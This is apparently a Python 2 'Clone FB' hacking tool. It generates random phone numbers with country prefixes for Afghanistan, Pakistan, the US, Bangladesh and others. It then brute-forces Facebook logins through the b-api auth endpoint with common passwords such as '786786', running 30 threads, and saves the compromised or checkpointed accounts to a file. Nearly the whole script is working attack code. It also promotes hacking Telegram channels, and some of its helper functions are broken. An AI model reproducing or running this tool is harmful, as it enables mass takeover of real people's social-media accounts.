#!/usr/bin/python2
#coding=utf-8
#mansoor_nabizada
#Telegram :https://t.me/joinchat/RiEBGyq4DYiJPWj5
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(100000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 Clone-fb.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mMansoor Nabi Zada█████████████████▒▒▒▒▒▒▒▒..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
os.system ('figlet -f small CLONE FB BY MK |lolcat')

CorrectPasscode = "Mansoor"

loop = 'true'
while (loop == 'true'):
    passcode = raw_input("\033[1;92m[?] \x1b[1;97mPASSWORD \x1b[1;97m: ")
    if (passcode == CorrectPasscode):
            print """
            \033[1;92mWelcome Mansoor Nabi Zada Zone
                  """
            loop = 'false'
    else:
            print "\033[1;91m☠️WRONG"
            os.system('xdg-open https://t.me/the_world_of_hacking')

##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    os.system ('figlet -f small KING Of KING |lolcat')
    print "\033[1;93m[1]\x1b[1;94mStart cloning ( no login fb account )"
    time.sleep(0.05)
    print '\x1b[1;93m[0]\033[1;94m Exit'
    pilih_login()

def pilih_login():
    peak = raw_input("\n\033[1;95mCHOOSE: \033[1;95m")
    if peak =="":
        print "\x1b[1;95mFill In Correctly"
        pilih_login()
    elif peak =="1":
        Zeek()
def Zeek():
    os.system('clear')
    os.system ('figlet -f small CLONE FB 8 COUNTRY |lolcat')
    print '\x1b[1;91m{\x1b[1;93m1\x1b[1;91m}\x1b[1;92m Attack From ÅFG FB Account'
    time.sleep(0.05)
    print '\x1b[1;91m{\x1b[1;93m2\x1b[1;91m}\x1b[1;92m Attack From PÅK FB Account'
    time.sleep(0.05)
    print '\x1b[1;91m{\x1b[1;93m3\x1b[1;91m}\x1b[1;92m Attack From ÏNDO FB Account'
    time.sleep(0.05)
    print '\x1b[1;91m{\x1b[1;93m4\x1b[1;91m}\x1b[1;92m Attack From ĀRAB FB Account'
    time.sleep(0.05)
    print '\x1b[1;91m{\x1b[1;93m5\x1b[1;91m}\x1b[1;92m Attack From ŰSA FB Account'
    time.sleep(0.05)
    print '\x1b[1;91m{\x1b[1;93m6\x1b[1;91m}\x1b[1;92m Attack From ĪRAN FB Account'
    time.sleep(0.05)
    print '\x1b[1;91m{\x1b[1;93m7\x1b[1;91m}\x1b[1;92m Attack From Bangladish FB Account'
    time.sleep(0.05)
    print '\x1b[1;91m{\x1b[1;93m8\x1b[1;91m}\x1b[1;92m Attack From ŤURK FB Account'
    time.sleep(0.05)
    print '\x1b[1;93m{0} Back'
    time.sleep(0.05)
    action()

def action():
    peak = raw_input('\n\033[1;95mCHOOSE:\033[1;97m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="1":              
        os.system("clear")
        os.system ('figlet -f small AFG FB CLONE |lolcat')
        print "\x1b[1;96mEnter any AFG Mobile code Number"+'\n'
        print '\x1b[1;94mEnter any code 1 to 49'
        try:
            c = raw_input("\033[1;96mCHOOSE : ")
            k="07"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax()
            
    elif peak =="2":              
        os.system("clear")
        os.system ('figlet -f small PAK FB CLONE |lolcat')
        print "\x1b[1;96mEnter any PAK Mobile code Number"+'\n'
        print '\x1b[1;97mEnter any code 1 to 49'
        try:
            c = raw_input("\033[1;96mCHOOSE : ")
            k="03"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax() 
            
    elif peak =="3":              
        os.system("clear")
        os.system ('figlet -f small INDO FB CLONE |lolcat')
        print "\x1b[1;96mEnter any INDO Mobile code Number"+'\n'
        print ' \x1b[1;92mEnter any code 1 to 49'
        try:
            c = raw_input("\033[1;96mCHOOSE : ")
            k="01"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax() 
      
    elif peak =="4":              
        os.system("clear")
        os.system ('figlet -f small ARAB FB CLONE |lolcat')
        print "\x1b[1;96mEnter any ARAB Mobile code Number"+'\n'
        print '\x1b[1;91mEnter any code 1 to 49'
        try:
            c = raw_input("\033[1;96mCHOOSE : ")
            k="06"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax() 
            
    elif peak =="5":              
        os.system("clear")
        os.system ('figlet -f small USA FB CLONE |lolcat')
        print "\x1b[1;96mEnter any USA Mobile code Number"+'\n'
        print '\x1b[1;98mEnter any code 1 to 49'
        try:
            c = raw_input("\033[1;96mCHOOSE : ")
            k="02"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax() 
            
    elif peak =="6":              
        os.system("clear")
        os.system ('figlet -f small IRAN FB CLONE |lolcat')
        print "\x1b[1;96mEnter any IRAN Mobile code Number"+'\n'
        print '\x1b[1;95mEnter any code 1 to 49'
        try:
            c = raw_input("\033[1;96mCHOOSE : ")
            k="09"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax() 
            
    elif peak =="7":              
        os.system("clear")
        os.system ('figlet -f small BANGLADISH FB CLONE |lolcat')
        print "\x1b[1;96mEnter any Bangladish Mobile code Number"+'\n'
        print '\x1b[1;93mEnter any code 1 to 49'
        try:
            c = raw_input("\033[1;96mCHOOSE : ")
            k="+880"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax() 
            
    elif peak =="8":              
        os.system("clear")
        os.system ('figlet -f small TURK FB CLONE |lolcat')
        print "\x1b[1;96mEnter any Turk Mobile code Number"+'\n'
        print '\x1b[1;92mEnter any code 1 to 49'
        try:
            c = raw_input("\033[1;96mCHOOSE : ")
            k="05"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax() 
      
              
    elif peak =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50* '\033[1;91m-'
    xxx = str(len(id))
    jalan ('\033[1;91m Total ids number: '+xxx)
    jalan ('\033[1;92mCode you choose: '+c)
    jalan ("\033[1;92mMansoor~NabiZada██████▒▒▒..99%Start Cracking...")
    jalan ("\033[1;92mTo Stop Process Press Ctrl+z")
    print 50* '\033[1;91m-'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m(OK)  ' + k + c + user + '  |  ' + pass1                                       
                okb = open('save/cloned.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m(CP) ' + k + c + user + '  |  ' + pass1
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m(OK)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m(CP) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3="100200"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m(OK)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m(CP) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4="500600"
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m(OK)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m(CP) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5="786786"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;92m(OK)  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(CP) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)           
                                        
                                            pass6="Afghanin"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;92m(OK)  ' + k + c + user + '  |  ' + pass6
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass6+'\n')
                                                okb.close()
                                                oks.append(c+user+pass6)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(CP) ' + k + c + user + '  |  ' + pass6 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass6+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass6)
                                                                                                                                                                                                                
                                                                                                                                                                                                                
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            


                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                            



        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Mansoor~Nabi Zada  Process Has Been Completed██████▒▒▒▒...100%'
    print 'Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
    print('MK.TM Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your Mansoor(CP)Accounts Open after 5 to 8 days")
    print ''
    print """
    
    
    
    

\033[1;91mThanks \033[1;97mUseing My CLONE FB Tool
\033[1;92m My Telegram\033[1;97m@the_world_of_hacking
\033[1;93mGitHub\033[1;97mmustafa123jan
\033[1;94mInstagram\033[1;97m∆@mustafa.kamgar"""

    
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()




